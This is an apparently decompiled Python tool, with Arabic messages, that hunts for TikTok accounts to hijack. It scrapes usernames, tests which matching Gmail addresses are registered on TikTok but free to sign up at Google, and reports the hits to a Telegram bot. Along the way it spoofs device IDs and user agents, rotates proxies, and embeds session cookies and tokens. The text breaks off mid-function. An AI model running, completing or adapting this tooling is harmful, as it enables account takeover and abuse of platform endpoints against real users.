# • DeCoDe By @H_S_W_M •
#------------------------------[الالوان]-----------------------
Z = '\033[1;31m';X = '\033[1;33m';F = '\033[2;32m' ;C = "\033[1;97m";B = '\033[2;36m';Y = '\033[1;34m';C = "\033[1;97m";E = '\033[1;31m';B = '\033[2;36m';G = '\033[1;32m';S = '\033[1;33m'
#------------------------------[zaid]----------------------------
try:import os,sys,webbrowser,socket,json,requests,random;from user_agent import generate_user_agent;from uuid import uuid4;import uuid;from bs4 import BeautifulSoup;from datetime import datetime;import telebot;import time;from random import randint, choice;from urllib.parse   import urlencode, quote
except:os.system("pip install requsets");os.system("pip install names");os.system("pip install user_agent");os.system("pip install uid");os.system("pip install uuid");os.system("pip install webbrowser");os.system("pip install socket");os.system("pip install datetime");os.system("pip install bs4");os.system("pip install telebot");os.system("pip install urllib");os.system("clear")
import secrets
cokie  = secrets.token_hex(8)*2
ya=0;no=0;nod=0;yas=0;em=0

try:
	sessionid="{}".format(str(secrets.token_hex(8) * 2))
	header = {"User-Agent": 'Mozilla/5.0 (Linux; Android 10; Lenovo K12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
	zzzug=requests.get('https://www-useast1a.tiktok.com/passport/web/user/login/?',headers=header).cookies.get_dict()['passport_csrf_token']
except:
	print(' حدث خطأ في الانترنت اعد تشغيل')
	exit()

os.system('clear')						
# zaidip = socket.gethostname()
# ipzaid = socket.gethostbyname(zaidip)
# url_ip = requests.get('https://pastebin.com/zk62zCxU').text
# if ipzaid in url_ip:
	# os.system('clear')
# else :
	# os.system('clear')
	# print(f'{S} OF The Tools Programmer Zaid ')
	# print(f' {F}@P_W_7 ')
	# exit()
print(('—'*25)+'\n• DeCoDe By @H_S_W_M •\n'+('—'*25))
ID= input('Enter ID : ')
tok= input('Enter Token :')
ugen,viv=[],[]
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
os.system('clear')
bot = telebot.TeleBot(tok)

def zzod(email):
 try:
 	user=email.split('@gmail.com')[0]
 	url=f'https://www.tiktok.com/@{user}'
 	json_data = {'query': '{{Property{{liveScreenshot(address: "{}"){{width height hash}}}}}}'.format(url),}
 	response = requests.post('https://api.hexometer.com/v2/ql', json=json_data)
 	image_hash = response.json()['data']['Property']['liveScreenshot']['hash']
 	img="https://fullpagescreencapture.com/screen/{}.jpg".format(image_hash)
 	#1024x600
 	bot = telebot.TeleBot(tok)
 	text= f"""
———————————————
• DeCoDe By @H_S_W_M •
———————————————
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
═══════════════════
𝙶𝙼𝙰𝙸𝙻 : {email}
═══════════════════
𝑷𝑹𝑶𝑮𝑹𝑨𝑴𝑴𝑹 : @P_W_7 | """
 	bot.send_photo(ID,photo=img,caption=text)
 except:
 	tt=f'''
———————————————
• DeCoDe By @H_S_W_M •
———————————————
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
═══════════════════
𝙶𝙼𝙰𝙸𝙻 : {email}
═══════════════════
𝑷𝑹𝑶𝑮𝑹𝑨𝑴𝑴𝑹 : @P_W_7 | 
'''

 	print(tt)
 	requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text="+str(tt))		
												
def check(email):
		#print(email)
		global ya,no,nod,yas
		eml=str(email)
		email=eml.split('@')[0]+'@gmail.com'

		he3 = {
	    "accept": "*/*",
	    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
	    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
	    "google-accounts-xsrf": "1",
	    "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
	    "sec-ch-ua-arch": "\"\"",
	    "sec-ch-ua-bitness": "\"\"",
	    "sec-ch-ua-full-version": "\"116.0.5845.72\"",
	    "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
	    "sec-ch-ua-mobile": "?1",
	    "sec-ch-ua-model": "\"ANY-LX2\"",
	    "sec-ch-ua-platform": "\"Android\"",
	    "sec-ch-ua-platform-version": "\"13.0.0\"",
	    "sec-ch-ua-wow64": "?0",
	    "sec-fetch-dest": "empty",
	    "sec-fetch-mode": "cors",
	    "sec-fetch-site": "same-origin",
	    "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
	    "x-client-data": "CJjbygE=",
	    "x-same-domain": "1",
	    "Referrer-Policy": "strict-origin-when-cross-origin",
	'user-agent': generate_user_agent()};tokk=requests.get('https://pepperygeneralactionscript.zodhok.repl.co/').text;da=(f'continue=https%3A%2F%2Fwww.google.com%2F&dsh=S1644399110%3A1695515527985204&flowEntry=ServiceLogin&hl=ar&ifkv=AYZoVhctgJglce8ngDS-YYmRkMjKcyuUZeIA6MlKZuxdmLk8INHHJp3tpqbQVyTNKjkpytBw8jTBiw&theme=glif&f.req=%5B%22{tokk}%22%2C%22zaid%22%2C%22ar%22%2C%22zaid%22%2C%22ar%22%2C0%2C0%2Cnull%2Cnull%2C%22web-glif-signup%22%2C0%2Cnull%2C1%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2C1%5D&azt=AFoagUWvOuuV65yGblelgMb8YgqIxqf-PQ%3A1695546705215&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C%22IQ%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C0%2Cnull%2C0%2C2%2C%22%22%2Cnull%2Cnull%2C0%2C0%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&checkConnection=youtube%3A847%3A1&checkedDomains=youtube&pstMsg=1&]')
		zaid= requests.post('https://accounts.google.com/_/signup/validatepersonaldetails?hl=ar&_reqid=43956&rt=j',headers=he3,data=da).text
		tl=zaid.split('["gf.ttu",null,"')[1].split('"],')[0]

		url = f'https://accounts.google.com/_/signup/usernameavailability?hl=ar&TL={tl}&_reqid=765070&rt=j'
		headers={
			'Accept': '*/*',
			'Accept-Encoding': 'gzip, deflate, br',
			'Accept-Language': 'en-US,en;q=0.9',
			'Content-Length': '898',
			'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
			'Cookie': cokie,
			'Google-Accounts-Xsrf': '1',
			'Origin': 'https://accounts.google.com',
			'Referer': f'https://accounts.google.com/signup/v2/emailsignup?sjid=12488103466622635336-EU&theme=glif&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
			'Sec-Ch-Ua': '"Not;A=Brand";v="8", "Chromium";v="117", "Google Chrome";v="117"',
			'Sec-Ch-Ua-Arch': '"x86"',
			'Sec-Ch-Ua-Bitness': '"64"',
			'Sec-Ch-Ua-Full-Version': '"117.0.5938.63"',
			'Sec-Ch-Ua-Full-Version-List': '"Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.63", "Google Chrome";v="117.0.5938.63"',
			'Sec-Ch-Ua-Mobile': '?0',
			'Sec-Ch-Ua-Model': '""',
			'Sec-Ch-Ua-Platform': '"Windows"',
			'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
			'Sec-Ch-Ua-Wow64': '?0',
			'Sec-Fetch-Dest': 'empty',
			'Sec-Fetch-Mode': 'cors',
			'Sec-Fetch-Site': 'same-origin',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
			'X-Same-Domain': '1',
		}

		data={
			'theme': 'glif',
			'continue': 'https://accounts.google.com/ManageAccount?nc=1',
			'f.req': f'["TL:{tl}","{str(email)}",0,0,0,null,0,3508]',
			'at': 'AFoagUU9EVwn5NhOjSbSekGRb853taFYlw:1695481442901',
			'azt': 'AFoagUUmBNb6Od8MKLAz3aR1k7PQTrK84Q:1695481442901',
			'cookiesDisabled': 'false',
			'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,2]',
			'gmscoreversion': 'undefined',
			'flowName': 'GlifWebSignIn',
			'checkConnection': 'youtube:671:0',
			'checkedDomains': 'youtube',
			'pstMsg': '1',
		}
	
		try:
		    rr = requests.post(url,headers=headers,data=data).text

		    #print(rr)
		except:
		    print('')
		if '"gf.uar",1,' in rr:
		    yas+=1
		    os.system('cls'if os.name=='net'else'clear')
		    check2(email)
		    print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
		    
		    #zzod(email)	    
		else:
			os.system('cls'if os.name=='net'else'clear')
			nod+=1
			#print(zom)
			print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
	
def check2(email):

	 global ya,no,nod,yas
	 email=str(email)
	 #print(email)
	 a='Mozilla/5.0 (Linux; Android'
	 b=random.randrange(1, 9);c=random.randrange(1, 9);d='11; Redmi Note 5A Lite)';e=random.randrange(100, 9999);f='AppleWebKit/537.36 (KHTML, like Gecko)';g=random.randrange(1, 9);h=random.randrange(1, 4);i=random.randrange(1, 4);j=random.randrange(1, 4);k='Chrome/96.0.4664.45 Mobile Safari/537.36'
	 ua=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	 url = "https://www.tiktok.com/passport/web/user/check_email_registered?shark_extra" 
	 data = f"email={email}&aid=1459&language=ar&account_sdk_source=web&region=IQ"
	 #proxy = '117.54.142.46:8080'
	 rr = requests.post(url,headers={"User-Agent": str(ua)},data=data).text#
	 #print(rr)
	 if '":{"is_registered":1' in rr:
	 	os.system('cls'if os.name=='net'else'clear')
	 	ya+=1

	 	print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')	
	 	zzod(email)
	 elif '":{"is_registered":0' in rr:
	 	os.system('cls'if os.name=='net'else'clear')
	 	no+=1

	 	print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
	 else:
	 	os.system('clear')
	 	print(' تم حضرك روح افتح Vpn وتعال حته اكملك فحص اركض انتضرك')
	 	time.sleep(20)
		 		 

def zod():
	 			user = input(f'{S}∆ - Write User TikTok: ')
	 			print('')
	 			print(f'{B}═════════════════════════════')
	 			try:
	 				api = requests.get(f'https://pp.zaidbot.repl.co/1/username={user}').json()
	 				#print(api)
	 			#print(api)
	 				id = api['Good']['ID']
	 				print(f'>ID Your Account : {E}{id}')
	 			except:
	 				os.system('clear')
	 				print('هنأك خطأ في اليوزر او اعد محاوله :(')
	 				exit()

	 			print(f'{B}>Please Get User : {E}{user}')
	 			uid = "".join(random.choice('1234567890')for i in range(18))
	 			url = f'https://api2.musical.ly/aweme/v1/user/following/list/?user_id={id}&max_time=0&count=200&offset=0&source_type=2&address_book_access=2&gps_access=2&manifest_version_code=2019081160&_rticket=1683237091650&app_language=ar&current_region=IQ&app_type=normal&iid=7229447308403246854&channel=googleplay&device_type=ANY-LX2&language=ar&locale=ar&resolution=1080*2298&openudid=39e9b96bb5c6e336&update_version_code=2019081160&sys_region=IQ&os_api=30&uoo=0&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&residence=IQ&carrier_region=IQ&ac=wifi&device_id=7{uid}&pass-route=1&mcc_mnc=41805&os_version=11&timezone_offset=10800&version_code=120603&carrier_region_v2=418&app_name=musical_ly&ab_version=12.6.3&version_name=12.6.3&device_brand=HONOR&ssmix=a&pass-region=1&device_platform=android&build_number=12.6.3&region=IQ&aid=1233&ts=1683237091&sec_user_id={user}'

	
	 			he = {
'Host': 'api2.musical.ly',
'Connection': 'keep-alive',
#'Cookie': 'passport_csrf_token=fe643108fc809482849e7dfe4fc28253; passport_csrf_token_default=fe643108fc809482849e7dfe4fc28253; odin_tt=6d0da3c272b6b3fdf504a6b43ac1da8f70d8872b7caa695d6f5152f784203ea90f331020b088191d47a595b7574acb70d43119ca35116d3937a1bc859c6314540b3ae2de388004ea0fd217af33a2832b; d_ticket=223f45e438c0574f7ae707ef80ec2cbec494d; sid_guard=b498b56540183aae828932739c5590b7%7C1683236955%7C15552000%7CTue%2C+31-Oct-2023+21%3A49%3A15+GMT; uid_tt=3a555cc3163b164eeedb0cf5d51c779e2823b5ee96a8bf818408a1b1ce277b57; uid_tt_ss=3a555cc3163b164eeedb0cf5d51c779e2823b5ee96a8bf818408a1b1ce277b57; sid_tt=b498b56540183aae828932739c5590b7; sessionid=b498b56540183aae828932739c5590b7; sessionid_ss=b498b56540183aae828932739c5590b7; store-idc=maliva; store-country-code=iq; store-country-code-src=uid; msToken=bAtq_vFJQfM3rcFn1HJDw5nsXDxelQjo2M3_CKDL-VPAhI60nL2IrGXuHpwTIDpPz1rztmGB-VDPVTLdCGYGRTGZWM8BCMk--Mqsut6MOE8=',
'Accept-Encoding': 'gzip',
'X-Tt-Token': '037f2cfd58e77cd7b0be4554246e63cdfe0242b73768098e70c16d1675296756818131c5ae2d90881a60dcc134192c82a23f68c542bf8102636b48cee24429ee523df95a2c32ed499b55cd521b528b3cf05c7aeaf27358da8e699d8bd75d0aed3d0fb-CkBkYTBhMTNlMWQ0N2Q4NzljNGQ0NmFjMGYwYzgzZDhjNWJlZGIzMWNkZGUyYTFjY2JlYmI2YjAyNGY0MzQwYzMw-2.0.0',
'sdk-version': '1',
'x-tt-trace-id': '00-6a42633d1d6a7cb70c972408a080b59f-6a42633d1d6a7cb7-01',
'User-Agent': 'com.zhiliaoapp.musically/2019081160 (Linux; U; Android 11; ar_IQ_#u-nu-latn; ANY-LX2; Build/HONORANY-L22CQ; Cronet/58.0.2991.0)',
'X-Khronos': '1683237091',
'X-Gorgon': '83005ff0000008006b5c40116ac60e806fbf539647c9578e953b',
	}
	

	 			re = requests.get(url,headers=he).json()
	
	 			#print(re)
	 			zz=0
	 			try:
	 				while True:
	 					zz+=1
	 					us=(re['followings'][zz]['unique_id'])

	 					#print(us)
	 					email=us
	 					check(email)
	 			except:
	 				print(' لقد انتهاء الفحص بنجاح ')


def zod2():
 while True:
  try:
                  header = {"User-Agent": 'Mozilla/5.0 (Linux; Android 10; Lenovo K12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
                  msToken=requests.get('https://www-useast1a.tiktok.com/passport/web/user/login/?',headers=header).cookies.get_dict()['msToken']
                  ttwid=requests.get('https://www.tiktok.com/',headers=header).cookies.get_dict()['ttwid']
  except:
    pass
    zaid()
  try:
   country='IQ'
   pro = random.choice(ugen)
   rng=int("".join(choice('3456789')for i in range(1)))
   user='qwertyuiopasdfghjklzxcvbnm'
   name=str("".join(random.choice(user)for i in range(rng)))
   params = urlencode({
'aid'               : 1988,
'app_language'      : 'en',
'app_name'          : 'tiktok_web',
'battery_info'      : '0.6',
'browser_language'  : 'en',
'browser_name'      : 'Mozilla',
'browser_online'    : 'true',
'browser_platform'  : 'Win32',
'browser_version'   : '5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
'channel'           : 'tiktok_web',
'cookie_enabled'    : 'true',
'device_id'         : randint(6999999999999999999, 7122222222222222222),
'device_platform'   : 'web_pc',
'focus_state'       : 'true',
'from_page'         : 'user',
'history_len'       : '3',
'is_fullscreen'     : 'false',
'is_page_visible'   : 'true',
'os'                : 'windows',
'priority_region'   : f'{country}',
'referer'           : '',
'region'            : f'{country}',
"screen_height"     :   randint(777, 888),
"screen_width"      :   randint(1333, 1666),
'tz_name'           : 'Europe/London',
'keyword'         : name,
'webcast_language'  : 'en',
})
   u=f'https://www.tiktok.com/api/search/user/full/?{params}'
   h={'Cookie':'ttwid='+ttwid+'; tiktok_webapp_theme=light; msToken=2cFfY83w7ZYqeJfgSrtprxuGTSGt6Gc0eDwFbgXg9X2H9QKDvqyP84CCl5rQLohHqsWmMbFe6wbNEP8-opBSk0lOsyjuzONVAKvkGqzDSqpjF06wiD6q7dttLj8SXD1G3Hrp; ttwid='+ttwid+'; passport_csrf_token='+zzzug+'; passport_csrf_token_default='+zzzug+'; uid_tt=586f8c5249e9ca4373252f9eee8e7c83c9d67acce516a2f60263e96bd2d05513; uid_tt_ss=586f8c5249e9ca4373252f9eee8e7c83c9d67acce516a2f60263e96bd2d05513; sid_tt='+sessionid+'; sessionid='+sessionid+'; sessionid_ss='+sessionid+'; sid_ucp_v1=1.0.0-KDM4Mzc5NGVjZjZiMTI2YmMwNDliMWZhYTFiZjRmNDQzYjBhMTFmNDkKIAiCiKiSlOmvu2MQgeeEoQYYswsgDDD3_tqbBjgBQOoHEAMaBm1hbGl2YSIgZDI2MTYzZjY4ZTZjOTVkNDljMDNlYzdmNzJkNzAwN2Q; ssid_ucp_v1=1.0.0-KDM4Mzc5NGVjZjZiMTI2YmMwNDliMWZhYTFiZjRmNDQzYjBhMTFmNDkKIAiCiKiSlOmvu2MQgeeEoQYYswsgDDD3_tqbBjgBQOoHEAMaBm1hbGl2YSIgZDI2MTYzZjY4ZTZjOTVkNDljMDNlYzdmNzJkNzAwN2Q; store-idc=maliva; store-country-code=tr; store-country-code-src=uid; tt-target-idc=useast1a; tt-target-idc-sign=cQMNfSjvvlNBGrwBOVqQa00_v09uRkDCThX0h3WaTo3QkciqJxdiEQWfUogQifipphJ2Ew8lBPW5swp2QVAyQLMcRUZM7pXPh0HyaHO8KrEiK9A3hSGZBZxSEAtjUhUMDQUDKDoC0cR0zeg-w2kkEIzXQLMsCGEMP93BoNLamPReCgAQrzLXVcgIYxWPpL5a-6aGuB43e42MWOqeJ5YSA9r0Un4DqveL_K1-LXhXjSwcnPfR6vF53zPExkDb2QMG0jvHTef2Y-aXwqVhDrmc22wJAL5bMgEqtWhsdetK292OW6-_yY0vNW4FeADvZClor00lmXAXqgknfgEXkqbWe8oDu4o4-WTVM8Y0YMAJeS7RJkEW_2Di7V1o17gI8-dYhyE7Zi_Gm9junoMOnpbye8K-E1Tr6NEmp-ceoY1_ic6BewgUoVNqe3A6sYigbBydUam2obTHgrQgOD0Qss3TjvigPlTsC8DrE9DXhiSqAe-dCSnuEL_2tbfXt433ZkPE; tt_csrf_token=PSOxiSio-0SwWbZDgx1udkrvw10E6D869hY4; tt_chain_token=xzQFbQnJcDXq3OHhlmhPQA==; __tea_cache_tokens_1988={%22_type_%22:%22default%22%2C%22user_unique_id%22:%227215088339640649222%22%2C%22timestamp%22:1679893715575}; passport_fe_beating_status=true; csrf_session_id=3f2907b98fa47d37c429fe3249297a97; msToken='+msToken+'',
                        'User-Agent':pro}
   r=requests.get(u,headers=h).json()
   rzo = r['user_list']
   for usz in rzo:
    email=str(usz['user_info']['unique_id'])
    if '_' in email:
    	continue
    else:
    	check(email)

  except:
    pass 
    zod2()

		

def znoxy(porx):
 while True:
  try:
                  header = {"User-Agent": 'Mozilla/5.0 (Linux; Android 10; Lenovo K12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
                  msToken=requests.get('https://www-useast1a.tiktok.com/passport/web/user/login/?',headers=header).cookies.get_dict()['msToken']
                  ttwid=requests.get('https://www.tiktok.com/',headers=header).cookies.get_dict()['ttwid']
  except:
    pass
    znoxy()
  try:
   country='IQ'
   pro = random.choice(ugen)
   rng=int("".join(choice('3456789')for i in range(1)))
   user='qwertyuiopasdfghjklzxcvbnm'
   name=str("".join(random.choice(user)for i in range(rng)))
   params = urlencode({
'aid'               : 1988,
'app_language'      : 'en',
'app_name'          : 'tiktok_web',
'battery_info'      : '0.6',
'browser_language'  : 'en',
'browser_name'      : 'Mozilla',
'browser_online'    : 'true',
'browser_platform'  : 'Win32',
'browser_version'   : '5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
'channel'           : 'tiktok_web',
'cookie_enabled'    : 'true',
'device_id'         : randint(6999999999999999999, 7122222222222222222),
'device_platform'   : 'web_pc',
'focus_state'       : 'true',
'from_page'         : 'user',
'history_len'       : '3',
'is_fullscreen'     : 'false',
'is_page_visible'   : 'true',
'os'                : 'windows',
'priority_region'   : f'{country}',
'referer'           : '',
'region'            : f'{country}',
"screen_height"     :   randint(777, 888),
"screen_width"      :   randint(1333, 1666),
'tz_name'           : 'Europe/London',
'keyword'         : name,
'webcast_language'  : 'en',
})
   u=f'https://www.tiktok.com/api/search/user/full/?{params}'
   h={'Cookie':'ttwid='+ttwid+'; tiktok_webapp_theme=light; msToken=2cFfY83w7ZYqeJfgSrtprxuGTSGt6Gc0eDwFbgXg9X2H9QKDvqyP84CCl5rQLohHqsWmMbFe6wbNEP8-opBSk0lOsyjuzONVAKvkGqzDSqpjF06wiD6q7dttLj8SXD1G3Hrp; ttwid='+ttwid+'; passport_csrf_token='+zzzug+'; passport_csrf_token_default='+zzzug+'; uid_tt=586f8c5249e9ca4373252f9eee8e7c83c9d67acce516a2f60263e96bd2d05513; uid_tt_ss=586f8c5249e9ca4373252f9eee8e7c83c9d67acce516a2f60263e96bd2d05513; sid_tt='+sessionid+'; sessionid='+sessionid+'; sessionid_ss='+sessionid+'; sid_ucp_v1=1.0.0-KDM4Mzc5NGVjZjZiMTI2YmMwNDliMWZhYTFiZjRmNDQzYjBhMTFmNDkKIAiCiKiSlOmvu2MQgeeEoQYYswsgDDD3_tqbBjgBQOoHEAMaBm1hbGl2YSIgZDI2MTYzZjY4ZTZjOTVkNDljMDNlYzdmNzJkNzAwN2Q; ssid_ucp_v1=1.0.0-KDM4Mzc5NGVjZjZiMTI2YmMwNDliMWZhYTFiZjRmNDQzYjBhMTFmNDkKIAiCiKiSlOmvu2MQgeeEoQYYswsgDDD3_tqbBjgBQOoHEAMaBm1hbGl2YSIgZDI2MTYzZjY4ZTZjOTVkNDljMDNlYzdmNzJkNzAwN2Q; store-idc=maliva; store-country-code=tr; store-country-code-src=uid; tt-target-idc=useast1a; tt-target-idc-sign=cQMNfSjvvlNBGrwBOVqQa00_v09uRkDCThX0h3WaTo3QkciqJxdiEQWfUogQifipphJ2Ew8lBPW5swp2QVAyQLMcRUZM7pXPh0HyaHO8KrEiK9A3hSGZBZxSEAtjUhUMDQUDKDoC0cR0zeg-w2kkEIzXQLMsCGEMP93BoNLamPReCgAQrzLXVcgIYxWPpL5a-6aGuB43e42MWOqeJ5YSA9r0Un4DqveL_K1-LXhXjSwcnPfR6vF53zPExkDb2QMG0jvHTef2Y-aXwqVhDrmc22wJAL5bMgEqtWhsdetK292OW6-_yY0vNW4FeADvZClor00lmXAXqgknfgEXkqbWe8oDu4o4-WTVM8Y0YMAJeS7RJkEW_2Di7V1o17gI8-dYhyE7Zi_Gm9junoMOnpbye8K-E1Tr6NEmp-ceoY1_ic6BewgUoVNqe3A6sYigbBydUam2obTHgrQgOD0Qss3TjvigPlTsC8DrE9DXhiSqAe-dCSnuEL_2tbfXt433ZkPE; tt_csrf_token=PSOxiSio-0SwWbZDgx1udkrvw10E6D869hY4; tt_chain_token=xzQFbQnJcDXq3OHhlmhPQA==; __tea_cache_tokens_1988={%22_type_%22:%22default%22%2C%22user_unique_id%22:%227215088339640649222%22%2C%22timestamp%22:1679893715575}; passport_fe_beating_status=true; csrf_session_id=3f2907b98fa47d37c429fe3249297a97; msToken='+msToken+'',
                        'User-Agent':pro}
   r=requests.get(u,headers=h).json()
   rzo = r['user_list']
   for usz in rzo:
    email=str(usz['user_info']['unique_id'])
    if '_' in email:
    	continue
    else:
    	global ya,no,nod,yas
    	email=str(email)+'@gmail.com'
    	#print(email)
    	a='Mozilla/5.0 (Linux; Android'
    	b=random.randrange(1, 9);c=random.randrange(1, 9);d='11; Redmi Note 5A Lite)';e=random.randrange(100, 9999);f='AppleWebKit/537.36 (KHTML, like Gecko)';g=random.randrange(1, 9);h=random.randrange(1, 4);i=random.randrange(1, 4);j=random.randrange(1, 4);k='Chrome/96.0.4664.45 Mobile Safari/537.36'
    	ua=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    	url = "https://www.tiktok.com/passport/web/user/check_email_registered?shark_extra" 
    	data = f"email={email}&aid=1459&language=ar&account_sdk_source=web&region=IQ"
    	#proxy = '117.54.142.46:8080'
    	try:
    		proo = random.choice(porx)
    		#print(proo)
    		proxies = {"http":proo, "https":proo}
    		rr = requests.post(url,headers={"User-Agent": str(ua)},data=data,proxies=proxies,timeout=4).text#
    	except:
    		rr = requests.post(url,headers={"User-Agent": str(ua)},data=data).text
    	#print(rr)
    	if '":{"is_registered":1' in rr:
    		os.system('cls'if os.name=='net'else'clear')
    		ya+=1
    		print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
    		eml=str(email)
    		email=eml.split('@')[0]+'@gmail.com'
    		he3 = {
	    "accept": "*/*",
	    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
	    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
	    "google-accounts-xsrf": "1",
	    "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
	    "sec-ch-ua-arch": "\"\"",
	    "sec-ch-ua-bitness": "\"\"",
	    "sec-ch-ua-full-version": "\"116.0.5845.72\"",
	    "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
	    "sec-ch-ua-mobile": "?1",
	    "sec-ch-ua-model": "\"ANY-LX2\"",
	    "sec-ch-ua-platform": "\"Android\"",
	    "sec-ch-ua-platform-version": "\"13.0.0\"",
	    "sec-ch-ua-wow64": "?0",
	    "sec-fetch-dest": "empty",
	    "sec-fetch-mode": "cors",
	    "sec-fetch-site": "same-origin",
	    "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
	    "x-client-data": "CJjbygE=",
	    "x-same-domain": "1",
	    "Referrer-Policy": "strict-origin-when-cross-origin",
